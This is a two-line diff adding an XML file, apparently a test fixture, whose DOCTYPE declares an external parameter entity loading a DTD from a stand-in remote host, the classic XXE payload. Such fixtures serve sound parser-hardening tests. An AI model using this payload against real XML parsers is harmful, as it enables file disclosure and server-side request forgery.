@@ -1,0 +1,2 @@
+<!DOCTYPE doc [<!ENTITY % p SYSTEM "http://example.invalid/p.dtd"> %p;]>
+<doc/>
